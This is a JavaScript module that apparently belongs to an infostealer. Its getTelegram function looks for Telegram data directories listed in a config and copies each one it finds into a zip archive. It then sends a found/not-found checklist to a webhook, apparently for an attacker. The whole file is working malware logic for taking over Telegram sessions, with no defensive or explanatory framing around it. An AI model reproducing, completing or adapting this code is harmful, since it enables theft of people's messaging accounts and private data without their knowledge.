module.exports = (client) => {
    return {
        async getTelegram() {
            var description = "";

            client.utils.jsziptg.createFolder("\\Telegram");

            for (let [key, value] of Object.entries(client.config.telegram.directory)) {
                if (client.requires.fs.existsSync(value)) {
                    description += `${key}: ✔️\n`;
                    client.utils.jsziptg.copyFolder(`\\Telegram\\`, value);
                } else {
                    description += `${key}: ❌\n`;
                }
            }


            await client.utils.webhook.sendToWebhook(
                {
                    "embeds": [client.utils.webhook.createEmbed({
                        "title": `Telegram | Result`,
                        "description": `\`\`\`${description}\`\`\``,
                    })],
                })
        }
    };
};